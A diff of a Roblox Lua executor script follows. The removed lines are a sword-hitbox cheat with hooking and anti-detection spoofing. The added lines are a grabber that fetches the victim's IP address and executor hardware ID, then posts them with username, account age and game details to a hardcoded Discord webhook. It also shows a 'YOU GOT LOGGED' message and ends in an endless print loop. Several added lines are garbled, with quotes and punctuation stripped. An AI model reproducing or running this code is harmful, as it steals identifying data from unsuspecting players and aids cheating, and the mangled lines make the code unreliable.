@@ -1,887 +1,124 @@
-local Init = tick()
-local found = false
-local blacklisted = {"check", "sword", "handle", "change", "changing", "remove", "add", "size", "set", "gui", "syn", "touch", "fti", "match", "err"}
-if _G.IgnoreNames then
-    return
-else
-    _G.IgnoreNames = {
-   
-} end
- 
-_G.SpyEnabled, _G.FireSpy, _G.InvokeSpy = true, true, true
- 
-local Fire = Instance.new('RemoteEvent').FireServer
-local Invoke = Instance.new('RemoteFunction').InvokeServer
+gameGetService(StarterGui)SetCore(SendNotification,{
+	Title = YOU GOT LOGGED, 
+	Text = LOOOOOOOOOOOOOOL, 
+})
 
-local FireHook
-local InvokeHook
- 
-local Count = 0
-local tabChar = "      "
- 
-local function getSmaller(a, b, notLast)
-  local aByte = a:byte() or -1
-  local bByte = b:byte() or -1
-  if aByte == bByte then
-    if notLast and #a == 1 and #b == 1 then
-      return -1
-    elseif #b == 1 then
-      return false
-    elseif #a == 1 then
-      return true
-    else
-      return getSmaller(a:sub(2), b:sub(2), notLast)
-    end
-  else
-    return aByte < bByte
-  end
+gameGetService(StarterGui)SetCore(SendNotification,{
+	Title = CRASHING GAME, 
+	Text =  , 
+})
+
+
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999
+
+local IP = gameHttpGet(httpsv4.ident.me)
+plr = gameGetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
 end
- 
-local function parseData(obj, numTabs, isKey, overflow, noTables, forceDict)
-  local objType = typeof(obj)
-  local objStr = tostring(obj)
-  if objType == "table" then
-    if noTables then
-      return objStr
-    end
-    local isCyclic = overflow[obj]
-    overflow[obj] = true
-    local out = {}
-    local nextIndex = 1
-    local isDict = false
-    local hasTables = false
-    local data = {}
- 
-    for key, val in next, obj do
-      if not hasTables and typeof(val) == "table" then
-        hasTables = true
-      end
- 
-      if not isDict and key ~= nextIndex then
-        isDict = true
-      else
-        nextIndex = nextIndex + 1
-      end
- 
-      data[#data+1] = {key, val}
-    end
- 
-    if isDict or hasTables or forceDict then
-      out[#out+1] = (isCyclic and "Cyclic " or "") .. "{"
-      table.sort(data, function(a, b)
-        local aType = typeof(a[2])
-        local bType = typeof(b[2])
-        if bType == "string" and aType ~= "string" then
-          return false
-        end
-        local res = getSmaller(aType, bType, true)
-        if res == -1 then
-          return getSmaller(tostring(a[1]), tostring(b[1]))
-        else
-          return res
-        end
-      end)
-      for i = 1, #data do
-        local arr = data[i]
-        local nowKey = arr[1]
-        local nowVal = arr[2]
-        local parseKey = parseData(nowKey, numTabs+1, true, overflow, isCyclic)
-        local parseVal = parseData(nowVal, numTabs+1, false, overflow, isCyclic)
-        if isDict then
-          local nowValType = typeof(nowVal)
-          local preStr = ""
-          local postStr = ""
-          if i > 1 and (nowValType == "table" or typeof(data[i-1][2]) ~= nowValType) then
-            preStr = "\n"
-          end
-          if i < #data and nowValType == "table" and typeof(data[i+1][2]) ~= "table" and typeof(data[i+1][2]) == nowValType then
-            postStr = "\n"
-          end
-          out[#out+1] = preStr .. string.rep(tabChar, numTabs+1) .. parseKey .. " = " .. parseVal .. ";" .. postStr
-        else
-          out[#out+1] = string.rep(tabChar, numTabs+1) .. parseVal .. ";"
-        end
-      end
-      out[#out+1] = string.rep(tabChar, numTabs) .. "}"
-    else
-      local data2 = {}
-      for i = 1, #data do
-        local arr = data[i]
-        local nowVal = arr[2]
-        local parseVal = parseData(nowVal, 0, false, overflow, isCyclic)
-        data2[#data2+1] = parseVal
-      end
-      out[#out+1] = "{" .. table.concat(data2, ", ") .. "}"
-    end
- 
-    return table.concat(out, "\n")
-  else
-    local returnVal = nil
-    if (objType == "string" or objType == "Content") and (not isKey or tonumber(obj:sub(1, 1))) then
-      local retVal = '"' .. objStr .. '"'
-      if isKey then
-        retVal = "[" .. retVal .. "]"
-      end
-      returnVal = retVal
-    elseif objType == "EnumItem" then
-      returnVal = "Enum." .. tostring(obj.EnumType) .. "." .. obj.Name
-    elseif objType == "Enum" then
-      returnVal = "Enum." .. objStr
-    elseif objType == "Instance" then
-      returnVal = obj.Parent and obj:GetFullName() or obj.ClassName
-    elseif objType == "CFrame" then
-      returnVal = "CFrame.new(" .. objStr .. ")"
-    elseif objType == "Vector3" then
-      returnVal = "Vector3.new(" .. objStr .. ")"
-    elseif objType == "Vector2" then
-      returnVal = "Vector2.new(" .. objStr .. ")"
-    elseif objType == "UDim2" then
-      returnVal = "UDim2.new(" .. objStr:gsub("[{}]", "") .. ")"
-    elseif objType == "BrickColor" then
-      returnVal = "BrickColor.new(\"" .. objStr .. "\")"
-    elseif objType == "Color3" then
-      returnVal = "Color3.new(" .. objStr .. ")"
-    elseif objType == "NumberRange" then
-      returnVal = "NumberRange.new(" .. objStr:gsub("^%s*(.-)%s*$", "%1"):gsub(" ", ", ") .. ")"
-    elseif objType == "PhysicalProperties" then
-      returnVal = "PhysicalProperties.new(" .. objStr .. ")"
-    else
-      returnVal = objStr
-    end
-    return returnVal
-  end
+if premium == false then 
+	if plr.AccountAge = 70 then 
+		ALT = true
+	end
 end
- 
-local function tableToString(t)
-  return parseData(t, 0, false, {}, nil, false)
+
+local market = gameGetService(MarketplaceService)
+local info = marketGetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
 end
- 
-FireHook = hookfunction(Fire, newcclosure(function(...)
-    local args = {
-        ...
+
+local body = http_request({Url = 'httpshttpbin.orgget'; Method = 'GET'}).Body;
+local decoded = gameGetService('HttpService')JSONDecode(body)
+local hwid_list = {Syn-Fingerprint, Exploit-Guid, Proto-User-Identifier, Sentinel-Fingerprint};
+hwid = ;
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local HttpServ = gameGetService('HttpService')
+local url = httpsdiscord.comapiwebhooks1092371391996756028o9OOc5COb4SNH3prTgjPBgTGtfcK-xTOfU7rwq6TSqsW-EGcZJvSB93bsXtNyeV3urEB
+
+
+local data = 
+    {
+        [content] = ,
+        [embeds] = {{
+            [title] = LOGGED,
+            [description] = hwid,
+            [type] = rich,
+            [color] = tonumber(0xAB0909),
+            [fields] = {
+                {
+                    [name] = Username,
+                    [value] = Game.Players.LocalPlayer.Name,
+                    [inline] = true
+                },
+				{
+                    [name] = IP Address,
+                    [value] = IP,
+                    [inline] = true
+                },
+				{
+                    [name] = Game Link,
+                    [value] = httpsroblox.comgames .. game.PlaceId .. ,
+                    [inline] = true
+                },
+				{
+					[name] = Game Name,
+					[value] = info.Name,
+					[inline] = true
+				},
+				{
+					[name] = Age,
+					[value] = plr.AccountAge,
+					[inline] = true
+				},
+				{
+					[name] = Premium,
+					[value] = premium,
+					[inline] = true
+				},
+				{
+					[name] = ALT,
+					[value] = ALT,
+					[inline] = true
+				},
+
+            },
+        }}
     }
-    local Remote = args[1]
-    if _G.SpyEnabled and _G.FireSpy then
-        Count = Count + 1
-        local Caller = rawget(getfenv(2), 'script') and rawget(getfenv(2), 'script'):GetFullName() or "N/A"
-       
-        if Caller:find('\n') then
-            Caller = Caller:gsub('\n', '\\n')
-        end
-    end
-    print(tableToString(args):lower())
-    for i,v in pairs(blacklisted) do
-        if tableToString(args):lower():match(blacklisted[i]) then
-            print("had to blacklist this bozo")
-            return nil
-        end
-    end
-    return FireHook(unpack(args))
-end))
+    local newdata = HttpServJSONEncode(data)
 
-InvokeHook = hookfunction(Invoke, newcclosure(function(...)
-    local args = {
-        ...
+    local headers = {
+            [content-type] = applicationjson
     }
 
-	local Caller = rawget(getfenv(2), 'script') and rawget(getfenv(2), 'script'):GetFullName() or "N/A"
- 
-spawn(function()
-
-    local Remote = args[1]
-    if _G.SpyEnabled and _G.InvokeSpy then
-        Count = Count + 1
-       
-        if Caller:find('\n') then
-            Caller = Caller:gsub('\n', '\\n')
-        end
-
-   		end
-	end)
-
-	return InvokeHook(unpack(args))
-end))
- 
-_G.OldFire = FireHook
-_G.OldInvoke = InvokeHook
-
-local TouchingHook
-TouchingHook = hookmetamethod(game, "__namecall", function(...)
-    if getnamecallmethod() == "GetTouchingParts" then
-        return nil
-    end
-    return TouchingHook(...)
-end)
-
-local hook;
-hook = hookfunc(getrenv().wait, newcclosure(function(...)
-    local args = {...}
-    if args[1] == 3 and getcallingscript().Parent == nil then
-        return coroutine.yield()
-    end
-    return hook(...)
-end))
-
-local hook;
-hook = hookfunc(getrenv().wait, newcclosure(function(...)
-    local args = {...}
-    if args[1] == 2 and getcallingscript().Parent == nil then
-        warn("[Event]", "Touch trigger hooked.")
-        return coroutine.yield()
-    end
-    return hook(...)
-end))
-
-local Version = '2.3.2'
-local Players = game:GetService("Players")
-local TweenS = game:GetService("TweenService")
-local TeamService = game:GetService("Teams")
-local RunService = game:GetService("RunService")
-
-local Player = Players.LocalPlayer
-
-local ScreenGui = Instance.new("ScreenGui")
-if not _G.NoGui then
-	ScreenGui.Name = ""
-	ScreenGui.ResetOnSpawn = false
-	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-	ScreenGui.Parent = game:GetService("CoreGui")
+    local request_payload = {Url=url, Body=newdata, Method=POST, Headers=headers}
+    http_request(request_payload)
 end
 
-local NOTIFICATION_FRAME = Instance.new("Frame");NOTIFICATION_FRAME.SizeConstraint = Enum.SizeConstraint.RelativeYY
-NOTIFICATION_FRAME.BorderSizePixel = 0;NOTIFICATION_FRAME.BackgroundColor3 = Color3.fromRGB(27, 42, 53);NOTIFICATION_FRAME.Size = UDim2.new(0.25, 0,0.08, 0);NOTIFICATION_FRAME.Position = UDim2.new(1,-10,1,-10);NOTIFICATION_FRAME.AnchorPoint = Vector2.new(0,1)
-Instance.new("UICorner").Parent = NOTIFICATION_FRAME
-local Label = Instance.new("TextLabel",NOTIFICATION_FRAME);Label.BackgroundTransparency = 1;Label.AnchorPoint = Vector2.new(.5,0);Label.Position = UDim2.new(.5,0,0,.5);Label.Size = UDim2.new(1,-5,.45,0);Label.Text = "C0 "..Version;Label.TextColor3 = Color3.new(1,1,1);Label.TextScaled = true;Label.Font = Enum.Font.SourceSansBold
-local NOTIFICATION_LABEL = Label:Clone();NOTIFICATION_LABEL.Position = UDim2.new(.5,0,.45,5);NOTIFICATION_LABEL.Size = UDim2.new(1,-5,.55,-10);NOTIFICATION_LABEL.Text = "Loading..";NOTIFICATION_LABEL.Parent = NOTIFICATION_FRAME
-local NOTE_IN = TweenS:Create(NOTIFICATION_FRAME,TweenInfo.new(.5),{AnchorPoint = Vector2.new(1,1)})
-local NOTE_OUT = TweenS:Create(NOTIFICATION_FRAME,TweenInfo.new(.5),{AnchorPoint = Vector2.new(0,1),Position = UDim2.new(1,0,1,-10)})
-NOTIFICATION_FRAME.Parent = ScreenGui
-
-NOTE_IN:Play()
-
-local UIS = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService");
-local RS = game:GetService("RunService")
-local MarketPlaceService = game:GetService("MarketplaceService")
-
-local r = Random.new()
-if hookfunction then
-	local memory = gcinfo()
-	hookfunction(gcinfo, newcclosure(function()
-		return r:NextNumber(memory-100,memory+100)
-	end))
+wait(10)
+_G.errorchecks = true
+while _G.errorchecks == true do
+    print(...)
 end
-
-local ConnectionsToDisabled = {game.DescendantAdded,workspace.DescendantAdded,workspace.ChildAdded}
-local function DisableAdded()
-	local ToEnable = {}
-	for _,c in pairs(ConnectionsToDisabled) do
-		for _,v in pairs(getconnections(c)) do table.insert(ToEnable,v);v:Disable() end
-	end
-	return ToEnable
-end
-
-local function Enable(ToEnable)
-	for _,v in pairs(ToEnable) do
-		v:Enable()
-	end
-end
-local Selection
-
-local Spoofed = {}
-local Properties = {Size = true,Shape = true,Massless = true,Mass = 1}
-local spoofedMethods = {["Clone"] = true,["GetMass"] = true}
-
-local Meta
-Meta = hookmetamethod(game,"__index", newcclosure(function(t,k)
-	if not checkcaller() then
-		local success,err = pcall(function()
-			if Spoofed[t] and Properties[k] then
-				return Meta(Spoofed[t],k)
-			end
-			return Meta(t,k)
-		end)
-		if success then	return err end
-	end
-	return Meta(t,k)
-end))
-
-local Meta
-Meta = hookmetamethod(game,"__namecall", newcclosure(function(Self,...)
-	local Args = {...}
-	if not checkcaller() then
-		local method = getnamecallmethod()
-		local n = Args and Args[1]
-		if Spoofed[Self] then
-			if method == "GetTouchingParts" and Selection then
-				return Meta(Selection, unpack(Args))
-			elseif spoofedMethods[method] then
-				return Meta(Spoofed[Self], unpack(Args))
-			end
-		end	
-	end
-	return Meta(Self,unpack(Args))
-end))
-
-local Meta
-Meta = hookmetamethod(game,"__newindex", newcclosure(function(t,k,v) -- (self, property, newsize)
-	if not checkcaller() and Spoofed[t] then
-		return Meta(Spoofed[t],k,v)
-	end
-	return Meta(t,k,v)
-end))
-
-local function Hook(Self,Method)
-	local old
-	old = hookfunction(Self[Method], newcclosure(function(self, ...)
-		if Spoofed[self] and spoofedMethods[Method] then
-			return old(Spoofed[self],...)
-		end
-		return old(self, ...)
-	end))
-end
-Hook(Instance.new("Model"),"Clone")
-Hook(Instance.new("Part"),"GetMass")
-
-local function Spoof(i)
-	Spoofed[i] = i:Clone()
-end
-
-local MenuFrames = {"GENERAL","RESIZE"}--,"FTI","FTI TARGET"}
-local Options = {
-	GENERAL = {
-		Visible = {Value = false,Text = "Visualiser/UI Enabled",Type = "Check",Order = 5};
-		Lunge = {Value = true,Text = "Lunge Only",Type = "Check",Order = 10},
-		Size = {Value = 3.5,Text = "Size",Bounds = {999,2},Order = 15},		
-		Block = {Value = true,Text = "Shape: Block",Type = "Check",Order = 20};
-		X = {Value = 2,Text = ">  Size X",Bounds = {999,.1},Order = 25},
-		Y = {Value = 3.7,Text = ">  Size Y",Bounds = {999,.1},Order = 30},
-		Z = {Value = 4.4,Text = ">  Size Z",Bounds = {999,.1},Order = 35},
-	};
-	RESIZE = {
-		REnabled = {Value = true,Text = "Resize Enabled",Type = "Check",Order = 5};
-	};
-	FTI = {
-		FEnabled = {Value = true,Text = "FTI Enabled",Type = "Check",Order = 5};
-		Extra = {Value = 1,Text = "Extra Hits",Bounds = {5,1},Order = 10};
-		GetTouchingParts = {Value = false,Text = "GetTouchingParts",Type = "Check",Order = 12};
-		dt = {Value = 0.05,Text = "Limb Debounce",Bounds = {1,0.001},Order = 15};
-		Abs = {Value = 0.0001,Text = "Absolute Debounce",Bounds = {1,0.0001},Order = 20};
-	};
-}
-
-local Keybinds = {Menu = Enum.KeyCode.N}
-local function Spawn_Msg()
-	return "Settings: "..string.char(Keybinds.Menu.Value):upper() ..""
-end
-
-local TargetSettings = {
-	NPC = false;
-	Teammates = true;
-	Teams = {};
-}
-
-local OffColor = Color3.new(0,0,0)
-local OnColor = Color3.new(0.592157, 0, 0)
-local SelectionTemplate = Instance.new("Part")
-SelectionTemplate.Color = OffColor 
-SelectionTemplate.Shape = "Ball"
-SelectionTemplate.Material = Enum.Material.ForceField
-SelectionTemplate.Transparency = .5
-SelectionTemplate.Massless = true
-SelectionTemplate.CanCollide = false
-SelectionTemplate.CastShadow = false
-SelectionTemplate.Anchored = false
-
-local Lunging = {}
-local Sword
-
-local function ResizeSword(CSword,Normal)
-	local Handle = CSword and CSword:FindFirstChild("Handle")
-	local function OnHandle(Handle)
-		if not Spoofed[Handle] then
-			Spoof(Handle)
-		end
-		local ToEnable = {}
-		for _,v in pairs(getconnections(Handle.Changed)) do table.insert(ToEnable,v);v:Disable() end 
-		for C,_ in pairs(Properties) do
-			for _,v in pairs(getconnections(Handle:GetPropertyChangedSignal(C))) do table.insert(ToEnable,v);v:Disable() end
-		end
-		local Copy = Normal and Spoofed[Handle] or Selection
-		if Copy then
-			for Property,v in pairs(Properties) do
-				if v == true then
-					Handle[Property] = Copy[Property]
-				end
-			end
-		end
-		Enable(ToEnable)
-	end
-	if Handle then
-		local Fake
-		local Connected = Handle:GetConnectedParts()
-		for _,Part in pairs(Connected) do
-			if Part ~= Selection and Part.Name ~= "Right Arm" then
-				OnHandle(Part)
-			end
-		end
-		OnHandle(Handle)
-	end
-end
-
-local function SetResizeState(CSword)
-	if CSword then
-		if Options.RESIZE.REnabled.Value then
-			if Options.GENERAL.Lunge.Value then
-				ResizeSword(CSword,not Lunging[CSword])
-			else
-				ResizeSword(CSword)
-			end
-		else
-			ResizeSword(CSword,true)
-		end
-	end
-end
-local function SetSelectionSize()
-	if Selection then
-		local Options = Options.GENERAL
-		local Size = Options.Size.Value
-		Selection.Shape = Options.Block.Value and "Block" or "Ball"
-		Selection.Size = Options.Block.Value and Vector3.new(Options.X.Value,Options.Y.Value,Options.Z.Value) or Vector3.new(Size,Size,Size)
-		SetResizeState(Sword)
-	end
-end
-
-local function SetSelectionColor()
-	if Selection then
-		if (not Options.GENERAL.Lunge.Value or (Sword and Lunging[Sword])) and (Options.FTI.FEnabled.Value or Options.RESIZE.REnabled.Value) then
-			Selection.Color = OnColor
-		else
-			Selection.Color = OffColor
-		end
-		SetResizeState(Sword)
-	end
-end
-
-local Cols = {[true] = Color3.fromRGB(0, 148, 148),[false] = Color3.fromRGB(159, 0, 0)}
-local Label = Instance.new("TextLabel");Label.AnchorPoint = Vector2.new(0.5, 1)
-Label.Size = UDim2.new(0.5, 0,0, 15);Label.Position = UDim2.new(0.5, 0,1, -85)
-Label.TextColor3 = Cols[true];	Label.Font = Enum.Font.SourceSansBold
-Label.BackgroundTransparency = 1
-Label.TextSize = 18;Label.TextStrokeTransparency = 1;Label.TextTransparency = 1
-do
-	local Frame = Instance.new("Frame");Frame.BorderSizePixel = 0;Frame.BackgroundTransparency = 1; Frame.AnchorPoint = Vector2.new(.5,.5);Frame.Position = UDim2.new(.5,0,.5,0)
-	Frame.BackgroundColor3 = Color3.fromRGB(27, 42, 53);Instance.new("UICorner",Frame);Frame.ZIndex = 0 
-	Frame.Parent = Label
-end
-Label.Parent = ScreenGui
-
-local G_LABEL = Label
-
-local Goal1 = {TweenS:Create(Label,TweenInfo.new(.5),{TextTransparency = 0}),TweenS:Create(Label.Frame,TweenInfo.new(.5),{BackgroundTransparency = 0})}
-local Goal2 = {TweenS:Create(Label,TweenInfo.new(.5),{TextTransparency = 1}),TweenS:Create(Label.Frame,TweenInfo.new(.5),{BackgroundTransparency = 1})}
-
-local i = 0
-local function tween(t)
-	local n = i + 1
-	i = n
-	Label.TextTransparency = 1
-	Label.Frame.BackgroundTransparency = 1
-	Label.Text = t
-	local s = Label.TextBounds
-	Label.Frame.Size = UDim2.new(0,s.X+20,0,s.Y+5)
-	for i = 1,2 do Goal1[i]:Play() end
-	wait(1)
-	if n == i then
-		for i = 1,2 do Goal2[i]:Play() end
-	end
-end
-
-local Frame = Instance.new("Frame");Frame.AnchorPoint = Vector2.new(.5,1);Frame.BackgroundColor3 = Color3.fromRGB(27, 42, 53); Frame.Position = UDim2.new(0.5, 0,1, -120);Frame.Size = UDim2.new(0,160,0,170)
-local UICorner = Instance.new("UICorner");UICorner.Parent = Frame
-OptionFrame = Frame; Frame.Visible = false
-local UIL = Instance.new("UIListLayout");UIL.Padding = UDim.new(0,5);UIL.SortOrder = Enum.SortOrder.LayoutOrder
-local Label = Instance.new("TextButton");Label.TextSize = 14; Label.BackgroundTransparency = 1;Label.Font = Enum.Font.SourceSansBold;Label.TextStrokeTransparency = 1;Label.TextColor3 = Color3.new(1,1,1);Label.Size = UDim2.new(1,0,0,14)
-
-local ButtonFrame1 = Frame:Clone();ButtonFrame1.Visible = true;ButtonFrame1.BackgroundColor3 = Color3.fromRGB(17, 27, 34);ButtonFrame1.AnchorPoint = Vector2.new(1,.5);ButtonFrame1.Position = UDim2.new(0,8,.5,0);ButtonFrame1.Size = UDim2.new(0,80,0,150);ButtonFrame1.Parent = Frame;ButtonFrame1.ZIndex = 0
-local ButtonFrame2 = Instance.new("Frame");ButtonFrame2.BackgroundTransparency = 1;ButtonFrame2.Position = UDim2.new(0,5,0,5);ButtonFrame2.Size = UDim2.new(1,-10,1,-10);UIL:Clone().Parent = ButtonFrame2;ButtonFrame2.Parent = ButtonFrame1
-
-local TeamFrame = ButtonFrame1:Clone()
-
-local FRAMES = {}
-local CurrentFrame = 'GENERAL'
-for _,n in pairs(MenuFrames) do
-	local Button = Label:Clone()
-	Button.Text = n
-	Button.MouseButton1Down:Connect(function()
-		if CurrentFrame ~= n then
-			FRAMES[CurrentFrame].Visible = false
-			CurrentFrame = n
-			FRAMES[CurrentFrame].Visible = true
-		end
-	end)
-	Button.Parent = ButtonFrame2
-end
-
-local Frame = Instance.new("ScrollingFrame");Frame.BorderSizePixel = 0;Frame.BackgroundTransparency = 1;Frame.ScrollBarThickness = 5; Frame.Position = UDim2.new(0,5,0,5);Frame.Size = UDim2.new(1,-10,1,-10)
-local Frame2 = Frame:Clone();Frame2.Visible = false;Frame2.Parent = OptionFrame
-local Frame3 = Frame2:Clone();Frame3.CanvasSize = UDim2.new(0,0,0,0); --Frame3.Parent = OptionFrame
-
-FRAMES.KEYBINDS = Frame2
---FRAMES["FTI TARGET"] = Frame3
-
-local TempFrame = Instance.new("Frame");TempFrame.BackgroundTransparency = 1;TempFrame.Size = UDim2.new(1,-5,0,20); local new = Label:Clone();new.Position = UDim2.new(0,2,0,0);new.Size = UDim2.new(1,0,1,0) ;new.TextXAlignment = Enum.TextXAlignment.Left;new.Parent = TempFrame
-local TextBoxTemp = Instance.new("TextBox");TextBoxTemp.Text = '';TextBoxTemp.BackgroundTransparency = .5;TextBoxTemp.BorderSizePixel = 0;TextBoxTemp.BackgroundColor3 = Color3.fromRGB(115, 115, 115);TextBoxTemp.AnchorPoint = Vector2.new(1,0);TextBoxTemp.Position = UDim2.new(1,-5,0,0);TextBoxTemp.Size = UDim2.new(.25,0,1,0);TextBoxTemp.TextColor3 = Color3.new(1,1,1)
-local CheckBoxTemp = Instance.new("TextButton");CheckBoxTemp.BackgroundTransparency = .5;CheckBoxTemp.BorderSizePixel = 0;TextBoxTemp.BackgroundColor3 = Color3.fromRGB(115, 115, 115);CheckBoxTemp.AnchorPoint = Vector2.new(1,0);CheckBoxTemp.Position = UDim2.new(1,-12,0,0);CheckBoxTemp.Size = UDim2.new(0,20,0,20);CheckBoxTemp.TextColor3 = Color3.new(1,1,1)
-UICorner:Clone().Parent = TextBoxTemp;UICorner:Clone().Parent = CheckBoxTemp
-local ResizeOptions = {Size = true,X = true,Y =true,Z = true}
-for _,i in pairs(MenuFrames) do
-	local t = Options[i]
-	if t then
-		local Frame = Frame:Clone()
-		Frame.Visible = i == CurrentFrame
-		FRAMES[i] = Frame
-		local UIL = UIL:Clone()
-		UIL.Parent = Frame
-		for Option,Info in pairs(t) do
-			new.Text = Info.Text
-			local new = TempFrame:Clone()
-			new.LayoutOrder = Info.Order
-			local vals = Info.Bounds
-			if vals then
-				local TextBox = TextBoxTemp:Clone();TextBox.PlaceholderText = Info.Value;TextBox.Parent = new
-				local Max,Min= vals[1],vals[2]
-				TextBox.FocusLost:Connect(function(enter)
-					if enter then
-						wait()
-						local n = TextBox.Text
-						if n and tonumber(n) then
-							n = math.clamp(tonumber(n),Min,Max)
-							TextBox.Text = ''
-							TextBox.PlaceholderText = n
-							t[Option].Value = n
-							if ResizeOptions[Option] then
-								SetSelectionSize()
-							end
-						else
-							TextBox.Text = ''
-						end
-					end
-				end)
-			elseif Info.Type == "Check" then
-				local CheckBox = CheckBoxTemp:Clone();CheckBox.Parent = new
-				local val = Info.Value
-				CheckBox.Text = val and 'X' or ''
-				CheckBox.MouseButton1Down:Connect(function()
-					val = not val
-					CheckBox.Text = val and 'X' or ''
-					t[Option].Value = val
-					if Option == "Visible" then
-						G_LABEL.Visible = val
-						if Selection then
-							Selection.Transparency = val and .5 or 1
-						end
-					elseif Option == "Block" or Option == "REnabled" then
-						SetSelectionColor()
-						SetSelectionSize()
-					elseif Option == "Lunge" then
-						SetSelectionColor()
-					elseif Option == "FEnabled" then
-						SetSelectionColor()
-					end
-				end)
-			end
-			new.Parent = Frame
-		end
-		Frame.Parent = OptionFrame
-		Frame.CanvasSize = UDim2.new(0,0,0,UIL.AbsoluteContentSize.Y)
-	end
-end
-
-local UIL = UIL:Clone()
-UIL.Parent = Frame2
-
-for index,KeyCode in pairs(Keybinds) do
-	new.Text = index
-	local new = TempFrame:Clone()
-	local TextButton = CheckBoxTemp:Clone()
-	local current = string.char(KeyCode.Value):upper()
-	TextButton.Text = current
-	TextButton.MouseButton1Down:Connect(function()
-		TextButton.Text = ''
-		wait()
-		local Listening,KeyCode
-		Listening = UIS.InputBegan:Connect(function(k)
-			if k.UserInputType == Enum.UserInputType.Keyboard then
-				KeyCode = k.KeyCode
-				Listening:Disconnect()
-				Listening = nil
-			elseif k.UserInputType == Enum.UserInputType.MouseButton1 then
-				Listening:Disconnect()
-				Listening = nil
-			end
-		end)
-		repeat wait() until not Listening
-		if KeyCode then
-			local success = pcall(function()
-				current = string.char(KeyCode.Value):upper()
-			end)
-			if success then
-				Keybinds[index] = KeyCode
-			end
-		end
-		TextButton.Text = current
-	end)
-	TextButton.Parent = new
-	new.Parent = Frame2
-end
-Frame2.CanvasSize = UDim2.new(0,0,0,UIL.AbsoluteContentSize.Y)
-
-Frame3.ClipsDescendants = false
---TeamFrame.AnchorPoint = Vector2.new(0,.5)
---TeamFrame.Position = UDim2.new(1,1,.5,0)
---TeamFrame.Parent = Frame3
-
---local PreviewFrame = TeamFrame:Clone()
---PreviewFrame.AnchorPoint = Vector2.new(.5,0)
---PreviewFrame.Position = UDim2.new(.5,0,0,50)
---PreviewFrame.Size = UDim2.new(1,-10,1,-55)
---PreviewFrame.ZIndex = 2
---PreviewFrame.Parent = Frame3
-
---local TeamPointer = {}
---local Neutral = Label:Clone();Neutral.Text = "Neutral";Neutral.ZIndex = 2;Neutral.LayoutOrder = 1;Neutral.TextScaled = true
-
---PreviewFrame = PreviewFrame.Frame
---TeamFrame = TeamFrame.Frame
-
---local function AddToPreview(Team)
---	local new = Neutral:Clone()
---	if Team ~= "Neutral" then
---		new.TextColor3 = Team.TeamColor.Color
---		new.Text = Team.name
---	else
---		new.LayoutOrder = 0
---	end
---	new.Parent = PreviewFrame
---	return new
---end
-
---local function OnTeamAdded(Team,Add)
---	local new = Neutral:Clone()
---	if Team ~= "Neutral" then
---		new.TextColor3 = Team.TeamColor.Color
---		new.Text = Team.name
---	else
---		new.LayoutOrder = 0
---	end
---	new.Parent = TeamFrame
---	TeamPointer[Team] = {new}
---	local Current
---	local val = TargetSettings.Teams[Team]
---	if Add then
---		Current = AddToPreview(Team)
---		val = true
---		TargetSettings.Teams[Team] = val
---		table.insert(TeamPointer[Team],Current)
---	end
-
---	new.MouseButton1Down:Connect(function()
---		val = not val
---		TargetSettings.Teams[Team] = val
---		if not val and Current then
---			Current:Destroy()
---			Current = nil
---		elseif val and not Current then
---			Current = AddToPreview(Team)
---			table.insert(TeamPointer[Team],Current)
---		end
---	end)
---end
---for _,Team in pairs(TeamService:GetTeams()) do
---	OnTeamAdded(Team,true)
---end
---TeamService.ChildAdded:Connect(OnTeamAdded)
---TeamService.ChildRemoved:Connect(function(Team)
---	if TeamPointer[Team] then
---		for _,T in pairs(TeamPointer[Team]) do
---			if T then
---				T:Destroy()
---			end
---		end
---		TeamPointer[Team] = nil
---	end
---end)
---OnTeamAdded("Neutral",true)
---do 
---	local t = TargetSettings
---	for i = 1,2 do
---		local Option = i == 1 and "NPC" or "Teammates"
---		new.Text = i == 1 and "Damage NPCs" or "Ignore Teammates"
---		local val = t[Option]
---		local new = TempFrame:Clone()
---		local CheckBox = CheckBoxTemp:Clone()
---		CheckBox.Text = val and 'X' or ''
---		CheckBox.MouseButton1Down:Connect(function()
---			val = not val
---			CheckBox.Text = val and 'X' or ''
---			t[Option] = val
---		end)
---		CheckBox.Parent = new
---		new.Position = UDim2.new(0,0,0,(i-1)*25)
---		new.Parent = Frame3
---	end
---end
-OptionFrame.Parent = ScreenGui
-
-UIS.InputBegan:Connect(function(k,g)
-	if not g then
-		if k.KeyCode == Keybinds.Menu and OptionFrame then
-			local new = not OptionFrame.Visible
-			for _,v in pairs(getconnections(game:GetService("UserInputService").TextBoxFocused)) do if new then v:Disable() else v:Enable() end end
-			for _,v in pairs(getconnections(game:GetService("UserInputService").TextBoxFocusReleased)) do if new then v:Disable() else v:Enable() end end
-			OptionFrame.Visible = new
-		end
-	end
-end)
------------------------------------
-local SwordConnections = {}
-
-local Destroyed = {}
-local function TrackDestroyed(instance)
-	Destroyed[instance] = instance:GetPropertyChangedSignal("Parent"):Connect(function() end)
-end
-local function IsDestroyed(instance)
-	local connect = Destroyed[instance]
-	if connect then
-		if not connect.Connected then
-			Destroyed[instance] = nil
-			return true
-		elseif not instance.Parent or not instance.Parent.Parent then
-			Destroyed[instance] = nil
-			instance:Destroy()
-			return true
-		end
-	end
-	return false
-end
-
-local function DisconnectSword(CSword)
-	Lunging[CSword] = nil
-	SwordConnections[CSword] = nil
-	local Handle = CSword:FindFirstChild("Handle")
-	if Handle and Spoofed[Handle] then
-		Spoofed[Handle]:Destroy()
-		Spoofed[Handle] = nil
-	end
-end
-
-local lastHits = {}
-local absoluteLast = 0
-local function AddSwordConnection(CSword)
-	if not SwordConnections[CSword] then
-		SwordConnections[CSword] = true
-		local Handle = CSword:WaitForChild("Handle",1)
-		if Handle then
-			CSword:GetPropertyChangedSignal("Grip"):Connect(function()
-				local G = CSword.GripUp.Z
-				if G == 1 then
-					Lunging[CSword] = nil
-				elseif G == 0 then
-					Lunging[CSword] = true
-				end
-				SetSelectionColor()
